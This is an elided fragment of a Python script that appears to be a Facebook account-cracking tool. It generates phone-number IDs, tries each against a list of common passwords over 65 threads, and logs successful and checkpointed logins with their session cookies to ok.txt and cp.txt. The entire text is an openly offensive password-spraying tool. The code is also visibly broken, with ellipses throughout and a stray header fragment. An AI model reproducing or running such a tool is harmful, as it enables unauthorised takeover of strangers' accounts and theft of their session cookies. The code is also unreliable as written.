...
def bd():
	...
	with ThreadPool(max_workers=65) as yaari:
		...
		for guru in uid:
			number = kode+guru
			pwx = [guru,kode+guru,'khankhan','khan123','khan1122','khankhankhan','123456','khan12345']
			yaari.submit(fcrack,uid,pwx,tl)
	print(47*"-")
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in ok.txt,cp.txt')
...
def fcrack(uid,pwx,tl):
	...
	'user-agent': syed
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[38;5;208m[XIYAD-ok] '+uid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[1;92m[XIYAD-cp] '+uid+' | '+ps+'\33[0;97m')
